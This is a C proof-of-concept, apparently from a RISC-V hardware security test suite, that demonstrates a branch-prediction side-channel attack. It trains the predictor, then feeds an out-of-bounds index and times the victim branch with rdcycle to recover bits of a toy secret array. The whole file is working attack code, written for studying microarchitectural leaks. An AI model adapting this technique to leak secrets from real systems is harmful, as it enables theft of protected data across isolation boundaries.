/*/////////////////////////////////////////////////////////////////////////////////
 * Name: Branch Direct Attack - b
 * Author: Rutvik Chavda
 * Description: This code demonstrates a branch prediction attack. The victim accesses
 *              specific array indices based on secret data, and the attacker measures
 *              the timing differences of the victim in order to gather information
 *              about the secret data.
 * License: GPL v3 - https://www.gnu.org/licenses/gpl-3.0.html
/////////////////////////////////////////////////////////////////////////////////*/
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include "encoding.h"

#define SECRET_DATA_SIZE 8
#define ATTACK_SAME_ROUNDS 10
#define TRAIN_TIMES 2
#define ARBITARY_DATA_SIZE 11

uint8_t sec_data[SECRET_DATA_SIZE] = {1, 0, 0, 1, 1, 0, 1, 0};
uint8_t array1[ARBITARY_DATA_SIZE] = {[0 ... 9] = 1, 1};

void branch(uint8_t *val) {
    if(*val) {
        __asm__ __volatile__("nop\n"
            "nop\n");
    } else {
        __asm__ __volatile__("addi t1, zero, 2\n");
    }
}

int main(void) {
    unsigned int start, diff;
    uint64_t attackIdx = (uint64_t)(sec_data - array1);
    uint64_t passInIdx, randIdx;
    unsigned int diff_values[TRAIN_TIMES+1][ATTACK_SAME_ROUNDS][SECRET_DATA_SIZE] = {};

    for(int i=0; i<SECRET_DATA_SIZE; i++) {
        for(int k=0; k<ATTACK_SAME_ROUNDS; k++) {
            for(int j=TRAIN_TIMES; j>=0; j--) {
                randIdx = k % 10;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF;
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx

                start = rdcycle();
                branch(&array1[passInIdx]); // Victim
                diff = rdcycle() - start;
                diff_values[j][k][i] = diff;
            }
        }
        attackIdx++;
    }
    printf("\nLower cycle count values in the attack round, coincide with the dummy value (1) in the spy array.\n");
    for(int i=0; i<SECRET_DATA_SIZE; i++) {
        printf("Index: %d \n", i+1);
        for(int k=0; k<ATTACK_SAME_ROUNDS; k++){
            printf("Training round: ");
            for(int j=TRAIN_TIMES; j>0; j--) {
                // Filter out abnormally high values due to background kernel tasks
                if(diff_values[j][k][i] < 200)
                    printf("%u, ", diff_values[j][k][i]);
            }
            printf("| Attack round: %u\n", diff_values[0][k][i]);
        }
        printf("\n\n");
    }
}